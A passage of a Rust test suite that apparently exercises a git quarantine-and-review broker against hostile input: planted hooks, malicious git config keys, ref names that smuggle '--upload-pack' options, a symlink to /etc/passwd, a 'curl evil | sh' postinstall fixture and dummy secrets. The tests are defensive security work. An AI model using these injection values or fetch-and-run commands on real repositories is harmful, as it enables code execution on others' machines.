//! End-to-end hostile tests. Temporary repositories and local bare remotes only.

mod common;

use std::fs;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicUsize, Ordering};

use common::*;
use gitbroker::{
    approve, escape_for_display, snapshot, ApprovalRequest, Approver, ApproverError, Decision,
    Error, ExclusionReason, FlagKind, PushAuth, Quarantine, Review, ReviewLimits, SecretRule,
};

/// Approves everything and counts calls. Tests only.
#[derive(Default)]
struct FakeApprover {
    calls: AtomicUsize,
}
impl Approver for FakeApprover {
    fn decide(&self, _: &ApprovalRequest<'_>) -> Result<Decision, ApproverError> {
        self.calls.fetch_add(1, Ordering::SeqCst);
        Ok(Decision::Approved {
            approver: "fake".to_string(),
        })
    }
}

struct Lab {
    _dir: tempfile::TempDir,
    root: PathBuf,
    src: PathBuf,
    remote: PathBuf,
    quarantine: Quarantine,
}

impl Lab {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        let root = fs::canonicalize(dir.path()).unwrap();
        let src = fixture_repo(&root.join("src"));
        let remote = root.join("remote.git");
        plain_git(&root, &["init", "-q", "--bare", remote.to_str().unwrap()]);
        let quarantine = Quarantine::create(&root.join("q.git")).unwrap();
        Self {
            _dir: dir,
            root,
            src,
            remote,
            quarantine,
        }
    }

    fn import(&mut self) {
        let bundle = make_bundle(&self.src, &self.root.join("b.bundle"));
        self.quarantine.import_bundle(&bundle, 64 * MB).unwrap();
    }

    /// Commit one file on top of the source repo, import it, and review it.
    fn review_file(&mut self, path: &str, content: &[u8]) -> Review {
        let base = commit_file(&self.src, "base.txt", b"base\n", "base");
        let tip = commit_file(&self.src, path, content, "change");
        self.import();
        self.quarantine.review(Some(&base), &tip).unwrap()
    }

    fn push_ok(&self, tip: &str, task: &str) -> Result<gitbroker::PushReceipt, Error> {
        let review = self.quarantine.review(None, tip)?;
        let approval = approve(&FakeApprover::default(), tip, &review)?;
        let auth = PushAuth::none().allowing_local_remote();
        self.quarantine
            .push(approval, self.remote.to_str().unwrap(), task, &auth)
    }

    fn remote_refs(&self) -> Vec<String> {
        let text = plain_git(&self.remote, &["for-each-ref", "--format=%(refname)"]);
        text.lines().map(str::to_string).collect()
    }

    fn task_ref(&self, task: &str) -> String {
        format!("refs/heads/{}{task}", brand::BRANCH_PREFIX)
    }
}

const ALL_HOOKS: &[&str] = &[
    "applypatch-msg",
    "pre-applypatch",
    "post-applypatch",
    "pre-commit",
    "pre-merge-commit",
    "prepare-commit-msg",
    "commit-msg",
    "post-commit",
    "pre-rebase",
    "post-checkout",
    "post-merge",
    "pre-push",
    "pre-receive",
    "update",
    "proc-receive",
    "post-receive",
    "post-update",
    "reference-transaction",
    "push-to-checkout",
    "pre-auto-gc",
    "post-rewrite",
    "sendemail-validate",
    "fsmonitor-watchman",
    "p4-changelist",
    "post-index-change",
];

fn plant_hooks(hooks_dir: &Path, marker: &Path) {
    fs::create_dir_all(hooks_dir).unwrap();
    for hook in ALL_HOOKS {
        let path = hooks_dir.join(hook);
        fs::write(
            &path,
            format!("#!/bin/sh\necho {hook} >> {}\n", marker.display()),
        )
        .unwrap();
        fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).unwrap();
    }
}

#[test]
fn planted_hooks_do_not_fire_on_import_review_push_or_snapshot() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"one\n", "first");
    let marker = lab.root.join("HOOK_FIRED");

    // Planted in the repo the bundle came from.
    plant_hooks(&lab.src.join(".git/hooks"), &marker);
    // Control: plain git does fire these hooks, so the marker test means something.
    plain_git(&lab.src, &["update-ref", "refs/control/x", &tip]);
    assert!(
        marker.exists(),
        "control failed: plain git did not fire the hook"
    );
    fs::remove_file(&marker).unwrap();

    // Making the bundle with plain git in that repo fires hooks too, so clear the
    // marker afterward. Only the broker's calls below may not touch it.
    let bundle = make_bundle(&lab.src, &lab.root.join("b.bundle"));
    if marker.exists() {
        fs::remove_file(&marker).unwrap();
    }

    // Planted in the quarantine as well, both as hooks and as a config setting that
    // points hooks somewhere else. This is the stronger case, since those are the
    // hooks that would really be consulted.
    let qdir = lab.quarantine.path().to_path_buf();
    plant_hooks(&qdir.join("hooks"), &marker);
    let alt_hooks = lab.root.join("alt-hooks");
    plant_hooks(&alt_hooks, &marker);
    plain_git(
        &qdir,
        &["config", "core.hooksPath", alt_hooks.to_str().unwrap()],
    );

    lab.quarantine.import_bundle(&bundle, 64 * MB).unwrap();
    assert!(!marker.exists(), "hook fired on import");

    let review = lab.quarantine.review(None, &tip).unwrap();
    assert!(!marker.exists(), "hook fired on review");

    let approval = approve(&FakeApprover::default(), &tip, &review).unwrap();
    let auth = PushAuth::none().allowing_local_remote();
    lab.quarantine
        .push(approval, lab.remote.to_str().unwrap(), "hooks", &auth)
        .unwrap();
    assert!(!marker.exists(), "hook fired on push");

    let dest = lab.root.join("snap");
    snapshot(&lab.src, &tip, &dest).unwrap();
    assert!(!marker.exists(), "hook fired on snapshot");

    // Control, now that the commit is present: plain git in the quarantine fires them.
    plain_git(&qdir, &["update-ref", "refs/control/z", &tip]);
    assert!(
        marker.exists(),
        "control failed: quarantine hooks were not live"
    );
}

#[test]
fn a_tracked_hook_in_the_bundle_is_only_data() {
    let mut lab = Lab::new();
    let marker = lab.root.join("HOOK_FIRED");
    let script = format!("#!/bin/sh\ntouch {}\n", marker.display());
    let tip = commit_file(&lab.src, ".husky/pre-push", script.as_bytes(), "hook");
    lab.import();
    let review = lab.quarantine.review(None, &tip).unwrap();
    assert!(review.has_flag(FlagKind::GitHooks));
    lab.push_ok(&tip, "tracked").unwrap();
    assert!(!marker.exists());
}

#[test]
fn hostile_repo_config_does_not_run_on_snapshot() {
    let lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"one\n", "first");
    let marker = lab.root.join("CONFIG_FIRED");
    let script = lab.root.join("evil.sh");
    fs::write(&script, format!("#!/bin/sh\ntouch {}\n", marker.display())).unwrap();
    fs::set_permissions(&script, fs::Permissions::from_mode(0o755)).unwrap();
    let evil = script.to_str().unwrap();
    for key in [
        "core.fsmonitor",
        "core.sshCommand",
        "core.pager",
        "diff.external",
        "tar.tar.command",
    ] {
        plain_git(&lab.src, &["config", key, evil]);
    }
    snapshot(&lab.src, &tip, &lab.root.join("snap")).unwrap();
    assert!(!marker.exists());
}

#[test]
fn bundle_refs_beginning_with_a_dash_fail_safely() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"one\n", "first");
    let pack = pack_reachable(&lab.src, &tip);
    let marker = lab.root.join("PWNED");
    let hostile = [
        "-evil".to_string(),
        "--upload-pack=touch".to_string(),
        format!("--upload-pack=touch {}", marker.display()),
        "refs/heads/-evil".to_string(),
        "refs/heads/ok/--force".to_string(),
    ];
    for name in hostile {
        let bundle = raw_bundle(
            &lab.root.join("r.bundle"),
            &[format!("{tip} {name}")],
            &pack,
        );
        let err = lab.quarantine.import_bundle(&bundle, 64 * MB).unwrap_err();
        assert!(matches!(err, Error::BadRefName(_)), "{name}: {err}");
    }
    assert!(!marker.exists());
    let refs = plain_git(lab.quarantine.path(), &["for-each-ref"]);
    assert!(refs.is_empty(), "{refs}");
    assert!(!plain_git_status(
        lab.quarantine.path(),
        &["cat-file", "-e", &tip]
    ));
}

#[test]
fn one_bad_ref_rejects_the_whole_bundle() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"one\n", "first");
    let pack = pack_reachable(&lab.src, &tip);
    let lines = [
        format!("{tip} refs/heads/good"),
        format!("{tip} refs/replace/{tip}"),
    ];
    let bundle = raw_bundle(&lab.root.join("r.bundle"), &lines, &pack);
    let err = lab.quarantine.import_bundle(&bundle, 64 * MB).unwrap_err();
    assert!(matches!(err, Error::BadRefName(_)), "{err}");
    let refs = plain_git(lab.quarantine.path(), &["for-each-ref"]);
    assert!(refs.is_empty(), "{refs}");
}

#[test]
fn imports_land_only_under_refs_quarantine() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"one\n", "first");
    plain_git(&lab.src, &["tag", "v1"]);
    plain_git(&lab.src, &["tag", "-a", "v2", "-m", "annotated"]);
    plain_git(
        &lab.src,
        &["bundle", "create", "-q", "../all.bundle", "--all"],
    );
    let imported = lab
        .quarantine
        .import_bundle(&lab.root.join("all.bundle"), 64 * MB)
        .unwrap();
    assert_eq!(imported.import_id, 1);
    assert_eq!(imported.refs.len(), 4, "{:?}", imported.refs);
    let refs = plain_git(
        lab.quarantine.path(),
        &["for-each-ref", "--format=%(refname)"],
    );
    assert!(refs.lines().count() == 4, "{refs}");
    assert!(
        refs.lines().all(|r| r.starts_with("refs/quarantine/1/")),
        "{refs}"
    );
    assert!(refs.contains("refs/quarantine/1/heads/main"), "{refs}");
    assert!(refs.contains("refs/quarantine/1/HEAD"), "{refs}");
    assert!(!lab.quarantine.path().join("FETCH_HEAD").exists());
    assert!(plain_git_status(
        lab.quarantine.path(),
        &["cat-file", "-e", &tip]
    ));
}

#[test]
fn size_limit_is_enforced_before_anything_runs() {
    let mut lab = Lab::new();
    commit_file(&lab.src, "a.txt", b"one\n", "first");
    let bundle = make_bundle(&lab.src, &lab.root.join("b.bundle"));
    let size = fs::metadata(&bundle).unwrap().len();
    let err = lab.quarantine.import_bundle(&bundle, size - 1).unwrap_err();
    assert!(matches!(err, Error::BundleTooLarge { .. }), "{err}");
    lab.quarantine.import_bundle(&bundle, size).unwrap();
}

#[test]
fn bundle_path_must_be_a_regular_file() {
    let mut lab = Lab::new();
    commit_file(&lab.src, "a.txt", b"one\n", "first");
    let bundle = make_bundle(&lab.src, &lab.root.join("b.bundle"));
    let link = lab.root.join("link.bundle");
    symlink(&bundle, &link).unwrap();
    let err = lab.quarantine.import_bundle(&link, 64 * MB).unwrap_err();
    assert!(matches!(err, Error::BundleNotRegularFile), "{err}");

    let fifo = lab.root.join("fifo.bundle");
    assert!(Command::new("/usr/bin/mkfifo")
        .arg(&fifo)
        .status()
        .unwrap()
        .success());
    let err = lab.quarantine.import_bundle(&fifo, 64 * MB).unwrap_err();
    assert!(matches!(err, Error::BundleNotRegularFile), "{err}");

    let err = lab
        .quarantine
        .import_bundle(&lab.root, 64 * MB)
        .unwrap_err();
    assert!(matches!(err, Error::BundleNotRegularFile), "{err}");
}

#[test]
fn garbage_and_filtered_bundles_are_rejected() {
    let mut lab = Lab::new();
    commit_file(&lab.src, "a.txt", b"one\n", "first");
    let garbage = lab.root.join("garbage.bundle");
    fs::write(&garbage, b"not a bundle at all").unwrap();
    assert!(matches!(
        lab.quarantine.import_bundle(&garbage, MB),
        Err(Error::BundleMalformed(_))
    ));

    let filtered = lab.root.join("filtered.bundle");
    plain_git(
        &lab.src,
        &[
            "bundle",
            "create",
            "-q",
            filtered.to_str().unwrap(),
            "--filter=blob:none",
            "main",
        ],
    );
    assert!(matches!(
        lab.quarantine.import_bundle(&filtered, MB),
        Err(Error::BundleMalformed(_))
    ));

    let tip = plain_git(&lab.src, &["rev-parse", "HEAD"]);
    let truncated = raw_bundle(
        &lab.root.join("cut.bundle"),
        &[format!("{tip} refs/heads/main")],
        b"PACKgarbage",
    );
    assert!(matches!(
        lab.quarantine.import_bundle(&truncated, MB),
        Err(Error::ImportRejected { .. })
    ));
}

#[test]
fn missing_prerequisites_are_rejected_and_import_base_satisfies_them() {
    let mut lab = Lab::new();
    let base = commit_file(&lab.src, "a.txt", b"one\n", "first");
    let tip = commit_file(&lab.src, "b.txt", b"two\n", "second");
    let bundle = lab.root.join("thin.bundle");
    plain_git(
        &lab.src,
        &[
            "bundle",
            "create",
            "-q",
            bundle.to_str().unwrap(),
            &format!("{base}..main"),
        ],
    );
    let err = lab.quarantine.import_bundle(&bundle, MB).unwrap_err();
    assert!(matches!(err, Error::ImportRejected { .. }), "{err}");

    lab.quarantine.import_base(&lab.src, &base).unwrap();
    let imported = lab.quarantine.import_bundle(&bundle, MB).unwrap();
    assert_eq!(imported.prerequisites, std::slice::from_ref(&base));
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert_eq!(review.changes().len(), 1);
    assert_eq!(review.changes()[0].raw_path(), b"b.txt");

    // A base commit is reviewable, but it was never proposed, so it cannot be pushed.
    let base_review = lab.quarantine.review(None, &base).unwrap();
    let approval = approve(&FakeApprover::default(), &base, &base_review).unwrap();
    // It is reachable from the imported tip, so what stops it is the tip check.
    let auth = PushAuth::none().allowing_local_remote();
    let err = lab
        .quarantine
        .push(approval, lab.remote.to_str().unwrap(), "base", &auth)
        .unwrap_err();
    assert!(matches!(err, Error::TipMismatch { .. }), "{err}");
}

#[test]
fn malformed_objects_are_rejected_by_fsck() {
    for (mode, name, expected) in [
        ("100644", "..", "hasDotdot"),
        ("100644", ".git", "hasDotgit"),
        ("100644", ".GIT", "hasDotgit"),
        ("120000", ".gitmodules", "gitmodulesSymlink"),
        ("100644", "a/b", "fullPathname"),
    ] {
        let mut lab = Lab::new();
        commit_file(&lab.src, "a.txt", b"one\n", "first");
        let (commit, tree, blob) = malformed_commit(&lab.src, mode, name);
        let pack = pack_objects(&lab.src, &[&commit, &tree, &blob]);
        let bundle = raw_bundle(
            &lab.root.join("bad.bundle"),
            &[format!("{commit} refs/heads/main")],
            &pack,
        );

        // Control: without fsck, plain git accepts this bundle. So the rejection
        // below comes from the broker's settings and not from the bundle being junk.
        let control = lab.root.join("control.git");
        plain_git(
            &lab.root,
            &["init", "-q", "--bare", control.to_str().unwrap()],
        );
        plain_git(
            &control,
            &[
                "fetch",
                "-q",
                bundle.to_str().unwrap(),
                "refs/heads/main:refs/control/x",
            ],
        );

        let err = lab.quarantine.import_bundle(&bundle, MB).unwrap_err();
        match &err {
            Error::ImportRejected { stderr } => {
                assert!(stderr.contains(expected), "{name}: {stderr}");
            }
            other => panic!("{name}: {other}"),
        }
        let qdir = lab.quarantine.path();
        assert!(plain_git(qdir, &["for-each-ref"]).is_empty());
        assert!(!plain_git_status(qdir, &["cat-file", "-e", &commit]));
        let leftovers = fs::read_dir(qdir.join("objects/pack")).unwrap().count();
        assert_eq!(leftovers, 0, "a partial pack was left behind");
    }
}

#[test]
fn malformed_commit_without_author_is_rejected() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"one\n", "first");
    let tree = plain_git(&lab.src, &["rev-parse", "HEAD^{tree}"]);
    let body = format!("tree {tree}\n\nno author\n");
    let bad = String::from_utf8(plain_git_stdin(
        &lab.src,
        &[
            "hash-object",
            "-t",
            "commit",
            "--literally",
            "-w",
            "--stdin",
        ],
        body.as_bytes(),
    ))
    .unwrap()
    .trim()
    .to_string();
    let mut pack_list = vec![bad.clone()];
    let listed = plain_git(&lab.src, &["rev-list", "--objects", &tip]);
    pack_list.extend(
        listed
            .lines()
            .map(|l| l.split(' ').next().unwrap().to_string()),
    );
    let refs: Vec<&str> = pack_list.iter().map(String::as_str).collect();
    let pack = pack_objects(&lab.src, &refs);
    let bundle = raw_bundle(
        &lab.root.join("bad.bundle"),
        &[format!("{bad} refs/heads/main")],
        &pack,
    );
    let err = lab.quarantine.import_bundle(&bundle, MB).unwrap_err();
    assert!(err.to_string().contains("missingAuthor"), "{err}");
}

#[test]
fn file_path_with_newline_and_quotes_displays_safely() {
    let mut lab = Lab::new();
    let hostile = "evil\"name\nline2\t\x1b[31m.txt";
    let review = lab.review_file(hostile, b"x\n");
    let change = review
        .changes()
        .iter()
        .find(|c| c.raw_path() != b"base.txt")
        .unwrap();
    assert_eq!(change.raw_path(), hostile.as_bytes());
    assert_eq!(change.display_path, r#""evil\"name\nline2\t\x1b[31m.txt""#);
    assert!(review.has_flag(FlagKind::SuspiciousPath));

    let json = serde_json::to_string(&review).unwrap();
    assert!(!json.contains('\u{1b}'));
    for flag in review.flags() {
        if let Some(path) = &flag.path {
            assert!(path.bytes().all(|b| (0x20..0x7f).contains(&b)), "{path}");
        }
    }
    assert!(escape_for_display(hostile.as_bytes()).lines().count() == 1);
}

#[test]
fn non_utf8_paths_are_flagged_and_escaped() {
    use std::os::unix::ffi::OsStrExt;
    let mut lab = Lab::new();
    let base = commit_file(&lab.src, "base.txt", b"base\n", "base");
    let name = std::ffi::OsStr::from_bytes(b"caf\xc3\xa9-\xe2\x80\xae.txt");
    fs::write(lab.src.join(name), b"x\n").unwrap();
    let tip = commit_all(&lab.src, "bidi");
    lab.import();
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert!(review.has_flag(FlagKind::SuspiciousPath));
    let change = &review.changes()[0];
    assert!(change.display_path.is_ascii());
    assert!(
        change.display_path.contains("\\u{202e}"),
        "{}",
        change.display_path
    );
}

#[test]
fn claude_settings_flag_in_either_case() {
    let mut lab = Lab::new();
    let review = lab.review_file(".claude/settings.json", b"{}\n");
    assert!(review.has_flag(FlagKind::ClaudeConfig));

    let mut lab = Lab::new();
    let review = lab.review_file(".CLAUDE/Settings.json", b"{}\n");
    assert!(review.has_flag(FlagKind::ClaudeConfig));
    let flagged = review
        .flags()
        .iter()
        .find(|f| f.kind == FlagKind::ClaudeConfig)
        .unwrap();
    assert!(flagged
        .path
        .as_deref()
        .unwrap()
        .contains(".CLAUDE/Settings.json"));
}

#[test]
fn flagged_paths_flag_in_subdirectories_end_to_end() {
    for (path, kind) in [
        ("deep/.github/workflows/x.yml", FlagKind::GithubWorkflow),
        ("deep/.vscode/tasks.json", FlagKind::VscodeConfig),
        ("deep/.cursor/rules", FlagKind::CursorConfig),
        ("deep/CLAUDE.md", FlagKind::AgentInstructions),
        ("deep/AGENTS.md", FlagKind::AgentInstructions),
        (".gitattributes", FlagKind::Gitattributes),
        ("deep/.husky/pre-commit", FlagKind::GitHooks),
        ("deep/Makefile", FlagKind::Makefile),
        ("deep/Dockerfile.dev", FlagKind::Dockerfile),
        ("deep/docker-compose.yml", FlagKind::ComposeFile),
        ("deep/yarn.lock", FlagKind::Lockfile),
    ] {
        let mut lab = Lab::new();
        let review = lab.review_file(path, b"content\n");
        assert!(review.has_flag(kind), "{path}");
    }
}

#[test]
fn symlink_flags() {
    let mut lab = Lab::new();
    let base = commit_file(&lab.src, "base.txt", b"base\n", "base");
    symlink("/etc/passwd", lab.src.join("innocent")).unwrap();
    let tip = commit_all(&lab.src, "link");
    lab.import();
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert!(review.has_flag(FlagKind::Symlink));
    assert_eq!(review.changes()[0].new_mode, "120000");
}

#[test]
fn gitlink_flags() {
    let mut lab = Lab::new();
    let base = commit_file(&lab.src, "base.txt", b"base\n", "base");
    let entry = format!("160000,{},vendored", "a".repeat(40));
    plain_git(&lab.src, &["update-index", "--add", "--cacheinfo", &entry]);
    plain_git(&lab.src, &["commit", "-q", "-m", "gitlink"]);
    let tip = plain_git(&lab.src, &["rev-parse", "HEAD"]);
    lab.import();
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert!(review.has_flag(FlagKind::Gitlink));
    assert!(!review.has_flag(FlagKind::BlobNotScanned));
}

#[test]
fn new_executable_bit_flags_but_an_existing_one_does_not() {
    let mut lab = Lab::new();
    let base = commit_file(&lab.src, "run.sh", b"#!/bin/sh\n", "base");
    let path = lab.src.join("run.sh");
    fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).unwrap();
    let tip = commit_all(&lab.src, "chmod");
    fs::write(&path, b"#!/bin/sh\necho changed\n").unwrap();
    fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).unwrap();
    let tip2 = commit_all(&lab.src, "edit");
    lab.import();
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert!(review.has_flag(FlagKind::NewExecutable));
    let later = lab.quarantine.review(Some(&tip), &tip2).unwrap();
    assert!(!later.has_flag(FlagKind::NewExecutable));
}

#[test]
fn binary_flags_even_when_attributes_claim_text() {
    let mut lab = Lab::new();
    let base = commit_file(&lab.src, ".gitattributes", b"*.dat text diff\n", "base");
    let tip = commit_file(&lab.src, "x.dat", b"abc\0def\n", "bin");
    lab.import();
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert!(review.has_flag(FlagKind::Binary));
}

#[test]
fn a_secret_cannot_hide_behind_a_binary_attribute() {
    let mut lab = Lab::new();
    let key = format!("AKIA{}", "IOSFODNN7EXAMPLE");
    let base = commit_file(&lab.src, ".gitattributes", b"*.txt -diff binary\n", "base");
    let tip = commit_file(
        &lab.src,
        "x.txt",
        format!("key={key}\n").as_bytes(),
        "secret",
    );
    lab.import();
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert!(review.has_flag(FlagKind::LikelySecret(SecretRule::AwsAccessKey)));
}

fn all_output(review: &Review) -> String {
    format!("{review:?}\n{}", serde_json::to_string(review).unwrap())
}

#[test]
fn fake_aws_key_is_flagged_without_its_value_in_output() {
    let mut lab = Lab::new();
    let key = format!("AKIA{}", "IOSFODNN7EXAMPLE");
    let review = lab.review_file("config/app.txt", format!("safe\naws={key}\n").as_bytes());
    let flag = review
        .flags()
        .iter()
        .find(|f| f.kind == FlagKind::LikelySecret(SecretRule::AwsAccessKey))
        .expect("flagged");
    assert_eq!(flag.line, Some(2));
    assert!(flag.path.as_deref().unwrap().contains("config/app.txt"));
    let output = all_output(&review);
    assert!(!output.contains(&key), "{output}");
    assert!(!output.contains("IOSFODNN7EXAMPLE"), "{output}");
}

#[test]
fn every_secret_rule_flags_without_leaking_end_to_end() {
    let cases = [
        (format!("ghp_{}", "a".repeat(36)), SecretRule::GithubToken),
        (
            "-----BEGIN OPENSSH PRIVATE KEY-----".to_string(),
            SecretRule::PrivateKey,
        ),
        (
            format!("sk-ant-{}", "b".repeat(24)),
            SecretRule::AnthropicKey,
        ),
        (format!("npm_{}", "c".repeat(36)), SecretRule::NpmToken),
    ];
    for (value, rule) in cases {
        let mut lab = Lab::new();
        let review = lab.review_file("f.txt", format!("x {value} y\n").as_bytes());
        assert!(review.has_flag(FlagKind::LikelySecret(rule)), "{rule:?}");
        assert!(!all_output(&review).contains(&value), "{rule:?}");
    }
}

#[test]
fn a_secret_removed_later_is_still_found_because_the_push_publishes_it() {
    let mut lab = Lab::new();
    let key = format!("AKIA{}", "IOSFODNN7EXAMPLE");
    let base = commit_file(&lab.src, "a.txt", b"clean\n", "base");
    let leak = commit_file(&lab.src, "a.txt", format!("{key}\n").as_bytes(), "leak");
    let tip = commit_file(&lab.src, "a.txt", b"clean\n", "scrub");
    lab.import();
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert!(review.changes().is_empty(), "endpoints are identical");
    assert_eq!(review.commits_scanned(), 2);
    let flag = review
        .flags()
        .iter()
        .find(|f| f.kind == FlagKind::LikelySecret(SecretRule::AwsAccessKey))
        .expect("history was scanned");
    assert_eq!(flag.commit.as_deref(), Some(leak.as_str()));
    assert!(!all_output(&review).contains(&key));
}

#[test]
fn a_flagged_file_added_and_removed_in_history_still_flags() {
    let mut lab = Lab::new();
    let base = commit_file(&lab.src, "a.txt", b"clean\n", "base");
    commit_file(&lab.src, ".claude/settings.json", b"{}\n", "add");
    fs::remove_dir_all(lab.src.join(".claude")).unwrap();
    let tip = commit_all(&lab.src, "remove");
    lab.import();
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert!(review.changes().is_empty());
    assert!(review.has_flag(FlagKind::ClaudeConfig));
}

#[test]
fn a_secret_in_a_commit_message_is_flagged_without_its_value() {
    let mut lab = Lab::new();
    let key = format!("AKIA{}", "IOSFODNN7EXAMPLE");
    let base = commit_file(&lab.src, "a.txt", b"one\n", "base");
    let tip = commit_file(&lab.src, "a.txt", b"two\n", &format!("oops {key}"));
    lab.import();
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert!(review.has_flag(FlagKind::LikelySecret(SecretRule::AwsAccessKey)));
    assert!(!all_output(&review).contains(&key));
}

#[test]
fn a_key_used_as_a_file_name_does_not_reach_output() {
    let mut lab = Lab::new();
    let key = format!("AKIA{}", "IOSFODNN7EXAMPLE");
    let review = lab.review_file(&format!("{key}.txt"), b"x\n");
    assert!(review.has_flag(FlagKind::LikelySecret(SecretRule::AwsAccessKey)));
    let shown = serde_json::to_string(&review).unwrap();
    assert!(!shown.contains(&key), "{shown}");
}

#[test]
fn package_json_script_changes_flag_and_lifecycle_scripts_stand_out() {
    let mut lab = Lab::new();
    let base = commit_file(
        &lab.src,
        "web/package.json",
        br#"{"name":"x","scripts":{"test":"jest"}}"#,
        "base",
    );
    let name_only = commit_file(
        &lab.src,
        "web/package.json",
        br#"{"name":"y","scripts":{"test":"jest"}}"#,
        "rename",
    );
    let build = commit_file(
        &lab.src,
        "web/package.json",
        br#"{"name":"y","scripts":{"test":"jest","build":"tsc"}}"#,
        "build",
    );
    let post = commit_file(
        &lab.src,
        "web/package.json",
        br#"{"name":"y","scripts":{"test":"jest","build":"tsc","postinstall":"curl evil | sh"}}"#,
        "post",
    );
    lab.import();

    let review = lab.quarantine.review(Some(&base), &name_only).unwrap();
    assert!(!review.has_flag(FlagKind::PackageScripts));
    assert!(!review.has_flag(FlagKind::InstallScript));

    let review = lab.quarantine.review(Some(&name_only), &build).unwrap();
    assert!(review.has_flag(FlagKind::PackageScripts));
    assert!(!review.has_flag(FlagKind::InstallScript));

    let review = lab.quarantine.review(Some(&build), &post).unwrap();
    assert!(review.has_flag(FlagKind::InstallScript));
    let output = all_output(&review);
    assert!(output.contains("postinstall"));
    assert!(!output.contains("curl evil"), "{output}");
}

#[test]
fn unparseable_package_json_flags_instead_of_passing() {
    let mut lab = Lab::new();
    let review = lab.review_file("package.json", b"{ not json \"scripts\"");
    assert!(review.has_flag(FlagKind::PackageScripts));
}

#[test]
fn oversized_blobs_are_not_read_and_are_flagged() {
    let mut lab = Lab::new();
    let key = format!("AKIA{}", "IOSFODNN7EXAMPLE");
    let big = format!("{key}\n{}", "x".repeat(4096));
    let base = commit_file(&lab.src, "a.txt", b"one\n", "base");
    let tip = commit_file(&lab.src, "big.txt", big.as_bytes(), "big");
    lab.import();
    lab.quarantine.set_review_limits(ReviewLimits {
        max_blob_bytes: 1024,
        ..ReviewLimits::default()
    });
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert!(review.has_flag(FlagKind::BlobNotScanned));
    assert!(!review.has_flag(FlagKind::LikelySecret(SecretRule::AwsAccessKey)));
}

#[test]
fn review_limits_mark_the_scan_incomplete() {
    let mut lab = Lab::new();
    let base = commit_file(&lab.src, "a.txt", b"0\n", "base");
    commit_file(&lab.src, "a.txt", b"1\n", "one");
    commit_file(&lab.src, "a.txt", b"2\n", "two");
    let tip = commit_file(&lab.src, "b.txt", b"3\n", "three");
    lab.import();
    assert!(lab.quarantine.review(Some(&base), &tip).unwrap().complete());

    lab.quarantine.set_review_limits(ReviewLimits {
        max_commits: 1,
        ..ReviewLimits::default()
    });
    let review = lab.quarantine.review(Some(&base), &tip).unwrap();
    assert!(!review.complete());
    assert!(review.has_flag(FlagKind::ScanIncomplete));

    lab.quarantine.set_review_limits(ReviewLimits {
        max_files: 1,
        ..ReviewLimits::default()
    });
    assert!(!lab.quarantine.review(Some(&base), &tip).unwrap().complete());

    lab.quarantine.set_review_limits(ReviewLimits {
        max_total_bytes: 1,
        ..ReviewLimits::default()
    });
    assert!(!lab.quarantine.review(Some(&base), &tip).unwrap().complete());
}

#[test]
fn review_flags_a_base_that_is_not_an_ancestor() {
    let mut lab = Lab::new();
    let root = commit_file(&lab.src, "a.txt", b"0\n", "root");
    let left = commit_file(&lab.src, "l.txt", b"l\n", "left");
    plain_git(&lab.src, &["checkout", "-q", "-b", "side", &root]);
    let right = commit_file(&lab.src, "r.txt", b"r\n", "right");
    lab.import();
    let review = lab.quarantine.review(Some(&left), &right).unwrap();
    assert!(review.has_flag(FlagKind::BaseNotAncestor));
    let review = lab.quarantine.review(Some(&root), &right).unwrap();
    assert!(!review.has_flag(FlagKind::BaseNotAncestor));
}

#[test]
fn review_refuses_revision_syntax_and_foreign_commits() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"0\n", "root");
    lab.import();
    for bad in ["HEAD", "main", "--all", &tip[..12], "-x"] {
        assert!(
            matches!(
                lab.quarantine.review(None, bad),
                Err(Error::InvalidCommitId(_))
            ),
            "{bad}"
        );
    }
    let absent = "1".repeat(40);
    assert!(matches!(
        lab.quarantine.review(None, &absent),
        Err(Error::CommitNotInQuarantine(_))
    ));
    let tree = plain_git(&lab.src, &["rev-parse", "HEAD^{tree}"]);
    assert!(matches!(
        lab.quarantine.review(None, &tree),
        Err(Error::CommitNotInQuarantine(_))
    ));
}

#[test]
fn approval_requires_the_reviewed_tip_and_does_not_consult_the_approver_otherwise() {
    let mut lab = Lab::new();
    let first = commit_file(&lab.src, "a.txt", b"1\n", "one");
    let second = commit_file(&lab.src, "a.txt", b"2\n", "two");
    lab.import();
    let review = lab.quarantine.review(None, &second).unwrap();
    let approver = FakeApprover::default();
    let err = approve(&approver, &first, &review).unwrap_err();
    assert!(matches!(err, Error::ApprovalMismatch { .. }), "{err}");
    assert_eq!(approver.calls.load(Ordering::SeqCst), 0);
    assert!(matches!(
        approve(&approver, "not-a-sha", &review),
        Err(Error::InvalidCommitId(_))
    ));

    let approval = approve(&approver, &second, &review).unwrap();
    assert_eq!(approver.calls.load(Ordering::SeqCst), 1);
    assert_eq!(approval.commit_sha(), second);
    assert_eq!(approval.tree_sha(), review.tree());
    assert_eq!(approval.tree_sha().len(), 40);
    assert_eq!(approval.approver(), "fake");
}

#[test]
fn a_denial_or_approver_failure_gives_no_approval() {
    struct No;
    impl Approver for No {
        fn decide(&self, _: &ApprovalRequest<'_>) -> Result<Decision, ApproverError> {
            Ok(Decision::Denied {
                reason: "no\x1b[31m".to_string(),
            })
        }
    }
    struct Broken;
